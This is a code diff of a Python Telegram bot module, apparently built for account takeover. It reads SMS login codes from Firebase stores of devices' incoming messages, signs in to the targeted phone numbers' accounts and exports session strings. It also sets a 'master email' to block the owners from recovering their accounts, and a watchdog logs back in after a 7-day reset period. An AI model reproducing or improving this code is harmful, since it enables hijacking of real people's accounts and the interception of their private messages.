@@ -2,13 +2,13 @@ import asyncio
 import logging
 import time
 import random
-import traceback # 🚨 Naya import
+import traceback
 from pyrogram import Client
 from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, RPCError
 import config
 import database as db
-from services.email_parser import get_telegram_email_otp
 from services.warp_manager import get_warp_proxy, start_warp
+import firebase_utils as fbu
 
 log = logging.getLogger("TGAuto")
 _WARP_READY = False
@@ -16,31 +16,74 @@ _WARP_READY = False
 async def ensure_warp():
     global _WARP_READY
     if not _WARP_READY:
-        log.info("WARP not ready. Attempting to start...")
         _WARP_READY = await start_warp()
     return _WARP_READY
 
-async def auto_login_tg(phone_number):
+# 🚨 Firebase URL se SIRF SMS OTP nikalne ka function
+async def wait_for_firebase_otp(phone_number, timeout=120):
+    start_time = time.time()
+    clean_phone = ''.join(filter(str.isdigit, phone_number))[-10:]
+    
+    while time.time() - start_time < timeout:
+        try:
+            d = db.load_data()
+            fbs = d.get("firebases", [])
+            
+            for fb in fbs[:5]:
+                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+                if not clients or not isinstance(clients, dict): continue
+                
+                for dev_id, c in clients.items():
+                    if not isinstance(c, dict): continue
+                    
+                    best_nums = fbu.extract_best_numbers(c, [])
+                    if not best_nums: continue
+                    
+                    if best_nums[0][0] == clean_phone:
+                        msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", fb.get("auth"))
+                        if not msgs: continue
+                        
+                        for m in msgs.values():
+                            if not isinstance(m, dict): continue
+                            if m.get("type") != "incoming": continue
+                            
+                            text = m.get("message", "")
+                            if "telegram" in text.lower():
+                                otp = fbu.extract_otp(text)
+                                if otp:
+                                    log.info(f"Found SMS OTP from Firebase: {otp}")
+                                    return otp
+        except Exception as e:
+            log.error(f"Firebase OTP error: {e}")
+        
+        await asyncio.sleep(5)
+    return None
+
+# 🚨 NAYA: Bot pe live progress bhejne ke liye (Owner ko)
+async def update_owner_progress(bot, text):
+    try:
+        await bot.send_message(config.MAIN_OWNER, f"🤖 <b>AI PROGRESS:</b>\n{text}", parse_mode="HTML")
+    except:
+        pass
+
+async def auto_login_tg(bot, phone_number):
     log.info(f"Starting Auto-Login for {phone_number}")
+    await update_owner_progress(bot, f"🔍 <b>Started Hunting:</b> <code>{phone_number}</code>\n⏳ Connecting to WARP Proxy...")
     
     d = db.load_data()
     if not d.get("hunting_enabled", True):
         return {"status": "failed", "reason": "Hunting is disabled by Owner"}
 
-    # 🚨 PRIORITY 1: Cloudflare WARP
     proxy_dict = None
     if await ensure_warp():
         proxy_dict = get_warp_proxy()
-        log.info("Using Cloudflare WARP Proxy.")
     
-    # 🚨 PRIORITY 2: Fallback to Custom/Free Proxies
     if not proxy_dict:
         proxies = d.get("working_proxies", [])
         if proxies:
             p = random.choice(proxies)
             ip, port = p.split(":")[:2]
             proxy_dict = {"scheme": "socks5", "hostname": ip, "port": int(port)}
-            log.info(f"Using Fallback Proxy: {ip}:{port}")
 
     app = Client(
         name=f"temp_{phone_number.replace('+', '')}",
@@ -52,57 +95,59 @@ async def auto_login_tg(phone_number):
     )
 
     try:
-        log.info("Connecting to Telegram...")
         await app.connect()
-        log.info("Connected. Sending code request...")
+        await update_owner_progress(bot, f"📡 Connected to Telegram. Sending OTP request...")
         
         try:
             sent_code = await app.send_code(phone_number)
-            log.info("Code request sent successfully.")
         except FloodWait as e:
             await app.disconnect()
-            return {"status": "failed", "reason": f"FloodWait: {e.value} seconds. Try after {e.value/60} mins."}
-        except RPCError as e:
-            await app.disconnect()
-            return {"status": "failed", "reason": f"Telegram API Error: {str(e)}"}
+            return {"status": "failed", "reason": f"FloodWait: {e.value}s"}
             
-        log.info(f"Waiting for Email OTP for {phone_number}...")
-        email_otp = await get_telegram_email_otp(timeout=90) 
+        await update_owner_progress(bot, f"⏳ <b>OTP Request Sent!</b>\nWait kar raha hu SMS OTP ka (Firebase URL se)... Timeout: 120s")
         
-        if not email_otp:
+        # 🚨 Sirf Firebase (SMS) se OTP dhundho
+        otp = await wait_for_firebase_otp(phone_number, timeout=120)
+        
+        if not otp:
             await app.disconnect()
-            return {"status": "failed", "reason": "Email OTP timeout. Check Gmail (iamnotready171@gmail.com) for OTP."}
+            return {"status": "failed", "reason": "SMS OTP timeout (Firebase URL me OTP nahi aaya)."}
 
-        log.info(f"Email OTP received: {email_otp}. Trying to sign in...")
+        await update_owner_progress(bot, f"🔑 <b>OTP Mila (SMS):</b> <code>{otp}</code>\n🔐 Login kar raha hu...")
         
         try:
-            await app.sign_in(phone_number, sent_code.phone_code_hash, email_otp)
+            await app.sign_in(phone_number, sent_code.phone_code_hash, otp)
         except SessionPasswordNeeded:
             await app.disconnect()
-            return {"status": "failed", "reason": "2FA Password is enabled on this account."}
+            return {"status": "failed", "reason": "2FA Password Enabled (Manual intervention needed)"}
         except PhoneCodeInvalid:
             await app.disconnect()
-            return {"status": "failed", "reason": "Invalid OTP passed."}
+            return {"status": "failed", "reason": "Invalid OTP"}
+
+        # 🚨 NAYA: Login successful! Ab Master Email set karo
+        await update_owner_progress(bot, f"✅ <b>Login Successful!</b>\nAb Master Email laga raha hu (taaki koi aur reset na kar sake)...")
+        
+        try:
+            await app.update_profile(email=config.MASTER_EMAIL)
+            log.info(f"Master Email set for {phone_number}")
+            await update_owner_progress(bot, f"🔒 <b>Master Email Set!</b> ({config.MASTER_EMAIL})\nAccount is now protected.")
+        except Exception as email_err:
+            log.warning(f"Could not set email: {email_err}")
+            await update_owner_progress(bot, f"⚠️ Email set nahi ho paya: {email_err}")
 
         session_string = await app.export_session_string()
         await app.disconnect()
 
-        log.info(f"Login Successful for {phone_number}!")
         return {"status": "success", "session": session_string, "phone": phone_number}
 
     except Exception as e:
-        # 🚨 Print full traceback for debugging
         error_details = traceback.format_exc()
-        log.error(f"Login failed for {phone_number}:\n{error_details}")
-        
+        log.error(f"Login failed:\n{error_details}")
         if app.is_connected: 
             await app.disconnect()
-            
-        # Get specific error if possible
-        error_str = str(e) if str(e) else error_details.split("\n")[-2]
-        return {"status": "failed", "reason": error_str}
+        return {"status": "failed", "reason": str(e)}
 
-async def reset_watchdog_loop():
+async def reset_watchdog_loop(bot):
     while True:
         d = db.load_data()
         if not d.get("hunting_enabled", True):
@@ -116,8 +161,8 @@ async def reset_watchdog_loop():
         for phone, acc in tg_accounts.items():
             if acc.get("status") == "waiting_7_days":
                 if now >= acc.get("reset_time", 0):
-                    log.info(f"7 Days over for {phone}. Triggering Re-login...")
-                    res = await auto_login_tg(phone)
+                    await update_owner_progress(bot, f"🕒 <b>7 Days Complete!</b>\n{phone} ka timer khatam. Re-login try kar raha hu...")
+                    res = await auto_login_tg(bot, phone)
                     if res["status"] == "success":
                         acc["session"] = res["session"]
                         acc["status"] = "active"
